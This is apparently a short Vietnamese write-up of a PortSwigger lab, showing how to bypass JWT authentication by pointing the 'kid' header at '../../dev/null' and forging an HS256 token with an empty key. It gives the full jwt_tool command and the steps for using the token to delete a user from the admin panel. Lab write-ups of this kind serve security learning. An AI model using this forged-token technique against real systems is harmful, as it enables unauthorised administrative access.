---
title: JWT authentication bypass via kid header path traversal
date: 2023-04-18 12:15:12 +0700
categories: [PortSwigger, JSON Web Token]
tags: [serverside, jwt]    # TAG names should always be lowercase
---

1. Dùng path traversal cho `kid` param trỏ đến file `/dev/null` là một file rỗng trên filesystem linux.
2. Dùng `jwt_tool` để craft token mới 
- Payload: ``python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""``
![image](https://user-images.githubusercontent.com/80744099/226424504-d48fc0af-1d76-4709-bf63-5e4815447d65.png)
![image](https://user-images.githubusercontent.com/80744099/226424736-2f112e71-ba23-44e7-8c03-2fa06797d833.png)
![image](https://user-images.githubusercontent.com/80744099/226423380-c7b4d8bd-73e7-48c3-9f56-cb1407689c14.png)
3. Gán token vào session cookie vào trang admin rồi xóa user carlos
![image](https://user-images.githubusercontent.com/80744099/226423593-6a7ac2fb-d06e-4fc5-9af8-7afedc920bb4.png)